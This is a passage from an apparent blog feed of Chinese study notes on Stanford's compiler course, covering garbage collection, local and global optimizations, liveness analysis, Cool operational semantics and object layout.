class="hljs-comment">&#x27; that p points to</span><br><span class="hljs-keyword">if</span> O<span class="hljs-comment">&#x27; is without a forwarding pointer</span><br>copy O<span class="hljs-comment">&#x27; to new space (update alloc pointer)</span><br><span class="hljs-keyword">set</span> a word <span class="hljs-keyword">of</span> old O<span class="hljs-comment">&#x27; to point the new copy (这一步就是标记旧的对象已经被拷贝了)</span><br>change p <span class="hljs-keyword">to</span> point <span class="hljs-keyword">to</span> the <span class="hljs-built_in">new</span> copy <span class="hljs-keyword">of</span> O<span class="hljs-comment">&#x27;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">set</span> p <span class="hljs-keyword">in</span> O equal <span class="hljs-keyword">to</span> the forwarding pointer<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">for</span><br>increment scan pointer <span class="hljs-keyword">to</span> the <span class="hljs-keyword">next</span> <span class="hljs-type">object</span><br>od<br></code></pre></td></tr></table></figure><p>优点：</p><ul><li>相对比较快，尤其垃圾比较多的时候，因为只需要处理可达对象</li><li>分配内存是简单且快速的，因为只需要增加heap pointer</li></ul><p>缺点：</p><ul><li>一些语言，如C和C++不允许对象拷贝，以及指针转移，<strong>因为指针作为对象语义的一部分在程序中公开</strong></li></ul><p>针对C和C++不允许对象拷贝，以及指针转移，有一些Conservativecollection技术</p><h2 id="引用计数">引用计数</h2><p>在没有耗尽内存的时候就开始对对象的引用数（每个分配操作都会引起引用计数），进行计数，一旦计数为0，说明该对象需要被回收了。</p><p><code>rp(x)为x的引用计数</code></p><p>每个赋值<code>x &lt;- y</code> ，这里假设x,y对象分别指向o和p：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(p)</span></span> &lt;- <span class="hljs-built_in">rc</span>(p) + <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(o)</span></span> &lt;- <span class="hljs-built_in">rc</span>(o) + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">rc</span>(o) == <span class="hljs-number">0</span>) then free o<br>x &lt;- y<br></code></pre></td></tr></table></figure><p><strong>优点：</strong></p><ul><li>易于实现</li><li>增量收集垃圾，而不会在执行过程中出现大量的停顿，因为它在没有耗尽内存的时候就开始对对象的引用数，每次赋值语句都可能会引起垃圾回收，但是每次的垃圾都是增量变化的，并不会占据很多时间。</li></ul><p><strong>缺点：</strong></p><ul><li>无法处理循环引用</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">x -&gt; A <span class="hljs-operator">=</span>&gt; B <span class="hljs-operator">=</span>&gt;A<br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> null<br></code></pre></td></tr></table></figure><p>上面语句里，x是一个指针引用了A，而A又引用了B，当x不再指向A的时候，由于A和B的引用计数始终不为0，所以没有办法回收A和B</p><ul><li>在每次分配时处理引用计数有的时候比较慢，如果一个赋值一句牵连到了很多对象，那么引用计数就会计算这些对象，可以在编译的时候优化这些赋值语句，比如如果有一个对象的两次更新，可以优化成一次，这样就会计算一次引用计数了。</li></ul><h2 id="总结">总结</h2><p>自动内存管理可防止严重的存储错误</p><p>But，也减少了程序员对内存的控制：</p><ul><li>例如，内存中的数据布局</li><li>例如，何时重新分配内存</li></ul><p>常见的自动内存管理问题：</p><ul><li>实时应用里可能由于垃圾回收时间过长出现短暂的程序停止</li><li>内存泄漏，一般多是程序员没有及时回收"野"对象</li></ul><p>有一些更高级的垃圾回收算法：</p><ul><li>concurrent: 垃圾回收的同时允许程序运行</li><li>generational：不会扫描长期存活对象（v8里就有）</li><li>real time: 减少因为垃圾回收引起的程序停止的下界</li><li>parallel: 允许多个垃圾回收器同时运行；</li></ul>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 9 Optimization</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出</p><hr /><h2 id="中间代码">中间代码</h2><p>什么是中间代码？一般常指介于高级语言(源语言)和低级语言(汇编语言)的一种语言</p><ul><li>Provides an intermediate level of abstraction<ul><li>More details than the source</li><li>Fewer details then the target</li></ul></li></ul><p>source lang =&gt;intermediate lang =&gt; target lang</p><p>intermediate lang = high-level assembly</p><ul><li>uses register names, but has unlimited number</li><li>Uses control structures like assemblly language</li><li>uses opcodes but some are higher level<ul><li>Eg: push translates to serveral assembly instructions</li><li>most opcodes correspond directly to assembly opcodes</li></ul></li></ul><p>每个指令都是以下两种形式之一(三地址码)：</p><ul><li>x := y op z</li><li>x := op y</li></ul><p>🌰：表达式 x + y * z可以转换成如下中间代码形式(每一个子表达式都有一个(寄存器)名称)：</p><ul><li><p>t1 := y * z</p></li><li><p>t2 := x + t1</p></li></ul><p><strong>总结</strong></p><p>中间代码的好处：与机器无关，可以在中间代码实现优化，提高了程序在不同系统架构之间迁移的可能性</p><h2 id="优化">优化</h2><p>Optimization is complex and largest phase</p><p>Parsing =&gt; Semantic =&gt; Opt =&gt; Gen</p><p>什么时候做优化？</p><ul><li>On AST ?<ul><li>Pro: Machine independent</li><li>Cons: Too high level</li></ul></li><li>On assembly lang ?<ul><li>Pro: Exposes optimization oppotunities</li><li>Cons: Machine dependent</li><li>Cons: Must reimplement optimizations when retargetting</li></ul></li><li>On intermediate lang ?<ul><li>Pro: machine independent</li><li>Pro: Exposes optimization oppotunities</li></ul></li></ul><p><strong>Basic Block:</strong> is a maximal sequence of instructionswith:</p><ul><li>no labels (except at the first instructions), and</li><li>no jumps (except at the last instructions)</li></ul><blockquote><p>其实就是指一段除了起始入口和末尾跳转(退出)指令没有其他跳转(退出)指令的一段指令集</p></blockquote><p>A basic block is a single-entry, single-exit, straight-line codesegment</p><blockquote><p>单一入口，单一出口，一行一行执行的程序段</p></blockquote><p><strong>control-flow graph</strong>：is a directed graph with:</p><ul><li>Basic blocks as nodes</li><li>An edge from block A to block B if the execution can pass from thelast instruction in A to the first instruction in B</li></ul><p>​ eg:</p><ul><li>the last instruction in A is <code>jump LabelB</code></li><li>execution can fall through from block A to block B (在blockA执行失败了后跳转到了block B)</li></ul><p>优化的好处：</p><ul><li>提高执行时间</li><li>减小代码体积</li><li>减少网络传输量</li><li>减小内存的使用</li><li>减小硬盘的使用（存储汇编代码文件）</li><li>减少硬件使用的电量 (这也可以，...)</li></ul><p>优化的三个粒度：</p><ul><li>local optimizations (局部优化)<ul><li>Apply to a basic block isolation</li></ul></li><li>global optimizations (全局优化)<ul><li>Apply to a control-flow in isolation</li></ul></li><li>Inter-procedural optimizations<ul><li>Apply across method boundaries</li></ul></li></ul><p>实际情况下：很难实现一个非常理想化的优化算法</p><ul><li>为什么？<ul><li>某些优化难以实现</li><li>某些优化会花费大量的编译时间</li><li>一些优化的回报很低</li><li>很多花哨的优化同时满足这三点</li></ul></li></ul><h2 id="局部优化">局部优化</h2><p>优化基本block，不涉及整个代码，比较简单</p><p><strong>algebra optimization (代数优化)</strong></p><p>有些运算可以被另一些更快的运算代替：</p><p>x := x * 8 =&gt; x := x &lt;&lt; 3</p><p><strong>Constant fold（常数折叠）</strong></p><p>Operations on constants can be computed at compile time:</p><ul><li>if there is a statement x := y op z</li><li>and y and z constants</li><li>then y op z can be computed at compile time</li></ul><p>Eg: x := 2 + 2 =&gt; x := 4; if 2 &lt; 0 jump L can be deleted</p><p>常数折叠也并不安全，因为会存在交叉编译的情况：</p><p>在X架构上编译到架构Y上运行，编译后的产物在X上运行和在Y上运行可能会产生不同的结果</p><p>X: a : = 1.2 + 6.9 经过常数折叠后=&gt; a := 8.1</p><p>Y: a: = 8</p><p><strong>单一赋值形式</strong>：每一个寄存器名称仅仅出现在一次在赋值语句的左侧</p><p>x := z + b := z + y</p><p>a := x =&gt; a := b</p><p>x := 2 * x x := 2 * b</p><p>这里有一个很重要的概念，和变量活跃度有关：Single assigment form</p><p>基于这个假设：如果基本块是以单一赋值形式出现的，即 <code>x:=</code>是在该块内仅有的一次为x赋值</p><p>那么当块内出现了相同的右侧表达式，这个表达式就是重复的（<strong>Commonsubexpression elimination</strong>）</p><p>🌰: 这个例子里x，y和z的值在省略号里是不会改变的</p><p>x := y + z x := y + z</p><p>... =&gt; ...</p><p>w := y + z w := x</p><p><strong>Copy propagatation（拷贝传播）</strong></p><p>假设基本块是以单一赋值形式存在的：</p><p>if w := x appears in a block, replace subsequent uses of w with usesof x</p><p>🌰:</p><p>b := z + y b := z + y</p><p>a := b =&gt; a := b</p><p>x := 2 * a x := 2 * b</p><p><strong>Dead code elimination</strong></p><p>上面的<code>a := b</code>对代码结果没什么恭喜，可以删除</p><p><strong>Unresearchable code delete</strong></p><p>删除不可达代码，减小代码体积</p><p>Eg:不可能走的条件分支语句；导入了一个包里所有的工具，但是有没有用(有点类似treeshaking)</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>代数优化后：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050407.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拷贝传播后：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>常数折叠：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050411.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>公共子表达式删除：</p><p>最终：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050416.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="peephole-optimization">Peephole Optimization</h2><h2 id="全局优化">全局优化</h2><p>为了在基本块之间用常数k代替变量x，编译器必须知道每条使用变量x路径的最后一个关于x的赋值语句<code>x := k</code>～～</p><p>对于全局优化，全局常量传播应该在～～处执行</p><p>所以全局优化的目标就是找到所有的～～</p><p>定义如下形式化符号：</p><table><thead><tr class="header"><th>value</th><th></th></tr></thead><tbody><tr class="odd"><td>$ $</td><td>This statement never executes（还没执行，一般用于初始化）</td></tr><tr class="even"><td>$ C $</td><td>X = C (C is constant)</td></tr><tr class="odd"><td>$$</td><td>X is not a constant（已执行，但是不确定具体值）</td></tr></tbody></table><p><strong>常数拷贝：</strong>常数拷贝是很有用的因为它可以使得一些变量直接转换成常量，从而减少寄存器的使用，但是在控制图里，判断一个变量是否可以被替换成常量是困难的</p><p>一种思路是一个变量的信息和它的上下文有关（前后语句） <spanclass="math display">\[C(s, x, in) = value \quad of \quad x \quad before \quad s  \quad在语句s之前变量x的信息\]</span></p><p><span class="math display">\[C(s, x, out) = value \quad of \quad x \quad after \quad s \quad在语句s之后变量x的信息\]</span></p><p>由于课本上的规则过于复杂，本人总结了以下规则rules：</p><ul><li>针对某个节点的入度，有以下几种情况：<ol type="1"><li>如果其入度节点其中有一个是T，则该节点信息为T</li><li>如果其入度节点存在常量，但是均不相等，则该节点信息为T</li><li>如果其入度节点存在节点固定为某个常量，且其入度节点不为T，则该节点也为该常量</li><li>如果其入度节点均为unknown，则该节点为unknown</li></ol></li><li>针对某个节点的出度，<ol start="5" type="1"><li><p>入度为unknown，则出度也为unknown</p></li><li><p>在s语句赋值为某个常量，则出度为该常量</p></li><li><p>在s语句赋值为某个非常量表达式，则出度为T</p></li><li><p>s语句如果没有对入度节点做任何更改，则出度=入度</p></li></ol></li></ul><p><strong>伪代码描述常量传播：</strong></p><blockquote><p>For every entry s to the program,，set C(s, x, in) = <spanclass="math inline">\(\top\)</span> set C(s, x, in) = C(s, x, out) =<span class="math display">\[\perp\]</span> everywhere else repeat utilall points satisfy 1-8： Pick s not satisfying 1-8 and update using theappropriate rule</p></blockquote><p><strong>为什么要引入$ $？</strong></p><p>由于循环，循环的每个点都需要值存在</p><p>直觉上，分配一些初始值去打破循环</p><p>$ $表示直到目前为止，控制流程还没有到达当前点；</p><p><spanclass="math inline">\(\top\)</span>事一种抽象值，因为不知道运行的时候具体的值，</p><p>C之间是不可比较的</p><p><span class="math inline">\(\top\)</span>是最大的，$ $是最小的</p><p><strong>符号形式化：</strong></p><p>对是$ ,, C$进行排序： <span class="math display">\[\perp &lt; C &lt; \top\]</span> 可以形象化如下：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520134741534.png"alt="image-20230520134741534" /><figcaption aria-hidden="true">image-20230520134741534</figcaption></figure><p>定义 <code>lub</code> 运算： 在这个层级规则下的最小上界</p><p><code>lub(x, y, z, ..)</code>：大于等于x,y,z,...的最小值</p><p>部分可以写作：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">C(<span class="hljs-params">s</span>, <span class="hljs-params">x</span>, <span class="hljs-params">in</span>)</span> = lub &#123; <span class="hljs-constructor">C(<span class="hljs-params">p</span>, <span class="hljs-params">x</span>, <span class="hljs-params">out</span>)</span> <span class="hljs-pattern-match">| p is a predecessor <span class="hljs-keyword">of</span> s &#125;</span><br><span class="hljs-pattern-match"></span><br></code></pre></td></tr></table></figure><p>🌰：</p><p><code>Lub(到, 1) = 1</code></p><p><code>Lub(T, 1) = 1</code></p><p><code>Lub(1, 2) = T</code></p><p>之前简单的说一直重复直到没什么东西发生变化才停止是不准确，不规范的；</p><p>正式描述应该使用lub，lub为什么是正确的？</p><ul><li>values start as 到 and only increase</li><li>$ $ can change to a constant, and a constant to <spanclass="math inline">\(\top\)</span></li><li>Thus, <code>C(s, x, _)</code> can change at most twice</li></ul><p>常量拷贝算法是的时间复杂度和程序大小成正比</p><blockquote><p>Number of steps =</p><p>Number of C(...) values computed * 2 =✖️2是因为每个语句的最多算两次</p><p>Number of program statements * 4 ✖️2是因为每个语句的in and out</p></blockquote><p><strong>变量生存分析：</strong></p><p>从程序退出节点开始分析，向上回溯节点，</p><ol type="1"><li>如果当前节点包含出度的活跃变量的赋值语句，则当前节点的入度，就不会在有这个活跃变量(因为重新赋值了，之前的相当于是deadcode，可以被视为dead variable)；</li><li>如果当前节点的rfs（右表达式）包含某个变量，则这些变量是活跃变量；</li></ol><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050601.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">有两个exit节点，initNode = </span><span class="hljs-template-variable">&#123; a, b &#125;</span><span class="language-xml">, lives = </span><span class="hljs-template-variable">&#123; b &#125;</span><span class="language-xml">，开始自底向上分析</span><br><span class="language-xml"></span><br><span class="language-xml">b = f + c 使用了f和c，产生了b，根据规则2，入度里f和c是活跃变量，根据规则1入度里b不是活跃变量 </span><span class="hljs-template-variable">&#123;f, c&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">f = 2 * e 使用了e，根据规则2，入度里e是活跃变量，f是新的赋值，根据规则1入度里f不是活跃变量，格局规则3，c的活跃不发生变化 </span><span class="hljs-template-variable">&#123;c, e&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">b = d + e，使用了d和e，根据规则2，d和e是活跃变量，而b被赋值了，c和f未出现1在左侧，所以</span><span class="hljs-template-variable">&#123;c,d,e,f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = e + 1, 使用了e，根据规则1，e是活跃变量，而c和f以及b都是其后续节点需要的，所以</span><span class="hljs-template-variable">&#123;b, c, e, f &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">对于分支处，取并集得：</span><span class="hljs-template-variable">&#123;b, c, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">对于f = 2 * e的入度，f被重新赋值，而e是被用的，所以</span><span class="hljs-template-variable">&#123; c, e &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">同理对于 b = d + e和e = e + 1的入度，其活跃变量已经计算过：</span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">取并集的e = d + f的出度 </span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = d + f的入度 =&gt; </span><span class="hljs-template-variable">&#123;c, d, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">d = -a 的入度 =&gt; </span><span class="hljs-template-variable">&#123;c, a, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">a = b + c的入度 =&gt; </span><span class="hljs-template-variable">&#123;f, c, b&#125;</span><br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>变量分析是自底向上，从程序的退出节点回溯的，因为程序退出的时候，可能希望某些变量依旧保存</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 6 Cool Operational semantics</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出。</p><h2 id="引言">引言</h2><p>类比：</p><p>parser阶段，我们要给每种token设置对应的action</p><p>语法分析阶段，有一系列的文法式，要在每个文法式规约的时候设置action，规定对应的行为</p><p>类型分析阶段：对每一种表达式设置对应的语义动作，进行语义分析</p><p>同样的优化阶段：对每一种表达式设置对应的代码生成及优化动作。</p><p>如何形式化表示这些表达式对应动作（语义，我理解就是表达式的动作）</p><blockquote><p>Denotational semantics: 数学函数表示</p><p>Axiomatic semantics: 通过逻辑公式描述程序行</p><p>Operational sematics: 通过执行规则描述程序评估</p></blockquote><h2 id="操作语义">操作语义</h2><p>在类型推断和检查的时候，引进过这样一种符号： <spanclass="math display">\[Context \vdash e: C在给定大的上下文context里，表达式是类型C\]</span>同样的，评估阶段(代码生成阶段之前的准备工作)，也会用类似的符号： <spanclass="math display">\[Context \vdash e: v在给定大的上下文context里，表达式会被评估为值v\]</span> 🌰： <span class="math display">\[\frac{Context \vdash e1: 5 \quadContext \vdash e2: 7}{Context \vdash e1 + e2: 12}\]</span> &gt;在语境Context下e1被评估为5，e2被评估为7，那么e1+e2就是12，当然这种是常量比较简单哈，没什么用处，实际情况下有变量的情况下就复杂了；&gt;</p><p>考虑评估：y &lt;- x + 1</p><p>由于存在局部作用域，所以评估一个值，需要：</p><p>Environment: where in memory a variable is</p><p>Store: what is in the memory</p><p>简单来说就是两个映射表：</p><p>Enviroment：va r =&gt; loc</p><p>Store: loc =&gt; value</p><p>形式化表示：</p><p><span class="math display">\[E = [a: l1, b: l2] \quad 变量a在内存中的l1处，b在内存的l2处 \\S = [l1 =&gt; 5, l2 =&gt; 7] \quad l1处存储的值是5，l2处存储的值是7 \\S&#39; = S[l2/l1] \quad defines \quad a \quad store \quadS&#39;\quad  such \quad that \\ S&#39;(l1) = 12 \quad and\quad  S&#39;(l) = S(l) \quad  if \quad l \neq l1 \\简单理解下S&#39;就是S在l1处做了单点修改\]</span></p><h2 id="cool里的语义">cool里的语义</h2><p>cool里面值都是对象（cool是面向对象的语言）</p><p><code>X(a1 = l1, ..., an = ln)</code> 表示为一个cool 对象，其中</p><ul><li><p>X是类</p></li><li><p>ai是其属性，包含继承的属性</p></li><li><p>li是对应ai被存储的内存位置</p></li></ul><p><strong>cool内置类：</strong></p><ul><li>Int(5),</li><li>Bool(true)</li><li>String(4, "cool") the string "Cool" of length 4</li><li>特殊值：void，该对象上没有方法，如果调用isvoid将会抛出异常，cool里对void的具体实现时NULL（Cpp里的空指针，因为cool是用cpp实现的）</li></ul><p>考虑如下评估式： <span class="math display">\[{so, E, S \vdash e: v, S&#39;}\]</span> so(self object)， E 是当前的变量环境，S是当前Store；</p><p>e获得了评估结果后值是v，并且新的store是S‘</p><p>评估的结果实际是值v和新的Store，新的Store是有副作用(副作用是值引用修改，而不是copy)</p><p>但是在评估后有一些事不会改变的：</p><ul><li><p>变量环境</p></li><li><p>self</p></li><li><p>操作语义允许递归</p></li></ul><p>下面具体介绍了cool的一些操作语义评估，我就简单那几个比较经典的：</p><hr /><p><strong>变量使用</strong>：在E中找到id的位置，然后在S中找对应的值<span class="math display">\[\frac{E(id) = I_{id} \quadS(I_{id}) = v}{so, E, S \vdash id: v, S}\]</span> ------</p><p><strong>self:</strong> <span class="math display">\[{so, E, S \vdash self: so, S}\]</span> ------</p><p><strong>变量赋值：</strong>就是对id处做单点修改返回新的Store，id的评估结果就是e的评估结果v<span class="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadE(id) = I_{id} \quadS_2 = S_1[v/id]}{so, E, S \vdash id=e: v, S2}\]</span> e1+e2：先递归对e1评估，评估后e1的值是v1，并产生新的StoreS1，接着对e2递归进行评估，评估后e2的值是v2，并产生新的StoreS2，最终e1+e2的评估结果就是值为v1 + v2，新的Store S2 <spanclass="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadso, E, S1 \vdash e: v2, S_2}{so, E, S \vdash e1 + e2: v1 + v2, S2}\]</span> ------</p><p>🌰：{ X = 7 + 5; 4;}</p><p>先对一个表达式X=7+5评估 <span class="math display">\[{so, [X&lt;-1], [l&lt;-0] \vdash x=7+5: ?, ?}\]</span> 继续递归对7+5进行评估 <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: ?, ?}\]</span> 继续递归对7评估： <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7: Int(7), [l&lt;-0]}\]</span> 同样的对5评估： <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 5: Int(5), [l&lt;-0]}\]</span></p><p>返回到上一层7+5: <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: Int(12), [l&lt;-0]}\]</span> 继续返回到上一层x=7+5：</p><p>这个时候已经处理完了7+5，继续处理x，这是声明变量，得到单点更新后的Store：<span class="math display">\[[l&lt;-0](12/l) =&gt; [l/12]\]</span> 这个时候子表达式都处理完了，继续处理最外层的第一个表达式 <spanclass="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash x=7+5: 12, [l&lt;-12]}\]</span> 继续处理同级别的表达式4 <span class="math display">\[{so, [X&lt;-l], [l&lt;-12] \vdash 4: Int(4), [l&lt;-12]}\]</span></p><p><span class="math display">\[\frac{...}{so, [X&lt;-1], [1&lt;-0] \vdash \{X=7+5;4;\}: Int(4),[1&lt;-12]}\]</span></p><hr /><p><strong>if-else</strong></p><p><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173710435.png"alt="image-20230514173710435" /> <span class="math display">\[\frac{so, E, S \vdash e1: Bool(false), S1}{so, E, S \vdash while \quade1 \quad loop \quad e2 \quad pool: void, S1}\]</span> ------</p><p><strong>while</strong></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173719883.png"alt="image-20230514173719883" /><figcaption aria-hidden="true">image-20230514173719883</figcaption></figure><hr /><p><strong>声明变量：</strong> <span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad so, ?, ? \vdash v, S2}{so, E, S\vdash let \quad id: T = e1 \quad in \quad e2: v2, S2}\]</span> e2应该在什么环境下评估呢（问号处应该填什么呢）？</p><p>—仍然是E，但是E里应该新增映射<code>id =&gt; Inew</code>，表示为id新分配了一块内存，同样的Store应该是有新的映射<code>Inew =&gt; v1</code></p><p>新增符号：Inew =newloc(S)，表示Inew是一个新分配的内存，newloc可以理解为是一个内存分配函数<span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad I_{new} = newloc(S1) \quad  so,E[I{new}/id], S1[v1/I_{new}] \vdash v2, S2}{so, E, S \vdash let \quadid: T = e1 \quad in \quad e2: v2, S2}\]</span></p><hr /><p><strong>new对象的评估语义：</strong></p><ul><li><p>首先，为对象的所有参数分配内存（本质上就是分配对象）</p></li><li><p>为对象设置缺省值</p></li><li><p>评估对象的初始化语句，并重新设置属性值</p></li><li><p>返回被分配的对象</p></li></ul><p>每个对象都有默认值</p><ul><li><p>int： Int(0)</p></li><li><p>bool: Bool(false)</p></li><li><p>String: String(0, '')</p></li></ul><p>类A的形式化表示：</p><p><code>class(A) = (a1: T1 &lt;-e1, ..., an: Tn &lt;- en)</code>，其中：</p><ul><li><code>ai</code>是属性，包含继承属性</li><li><code>Ti</code>是属性的类型</li><li><code>ei</code>是初始化表达式</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173910377.png"alt="image-20230514173910377" /><figcaption aria-hidden="true">image-20230514173910377</figcaption></figure><p>在评估初始化表达式阶段：</p><ul><li><p>self is the current object</p></li><li><p>only the attributes are in scope()，作用域内只有属性</p></li><li><p>属性的初始值都是默认值，主要是防止在初始化语句里面会用到这些初始值，比如:<code>Class A &#123; a &lt;- a &#125;</code>，用a初始化a，如果a没有默认值，可能会有异常；</p></li></ul><p>Informal semantics of class e0.f(e1, ..., en)：</p><ul><li><p>首先，依次评估参数e1, ..., en，</p></li><li><p>评估e0，获得e0的值</p></li><li><p>假设X是e0评估结果的动态类型</p></li><li><p>从dispatch table中获取f</p></li><li><p>为n个参数分配内存空间，更新Enviroment</p></li><li><p>为分配的空间初始化值</p></li><li><p>set selft to the target object and evaluate f's body</p></li></ul><p>For a class <code>A</code> and a method f of <code>A</code> (possibleinherited)</p><p><code>impl(A, f) = (X1, ..., Xn, ebody)</code>，其中：</p><ul><li><code>Xi</code>是形式参数</li><li><code>ebody</code>是方法体(函数体)</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514174645616.png"alt="image-20230514174645616" /><figcaption aria-hidden="true">image-20230514174645616</figcaption></figure><p><u>impl</u>有没有可能获取不到方法？不可能，因为类型检查以已经通过了，倘若没有类型检查，这一阶段会更复杂</p><p>当然也有一些runtime error类型检查检查不到：</p><ul><li>A dispathc on void</li><li>Division by zero</li><li>Substring out of range</li><li>Heap overflow</li></ul><p>这些异常情形下，编译器必须抛出错误，并中断，而不是崩溃(not with asegfault)</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 8 Cool Object Layout</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出</p><h2 id="temporaries">Temporaries</h2><p>之前介绍的汇编代码比如两个表达式相加：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">a0</span> (<span class="hljs-number">0</span>)$<span class="hljs-built_in">sp</span><br>li $<span class="hljs-built_in">t0</span> ?<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">s0</span> $<span class="hljs-built_in">sp</span><br></code></pre></td></tr></table></figure><p>这里把其中一个加数放在了stack里，然后取出来，再把计算的中间结果放在了stack里，这就是临时变量</p><p>最普通的<strong><code>堆栈机</code></strong>需要在函数栈帧暂存这些临时变量（虽然这并不高效，后面会讲解关于临时变量分配到寄存器的算法）</p><p>考虑下面代码使用了多少临时变量：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 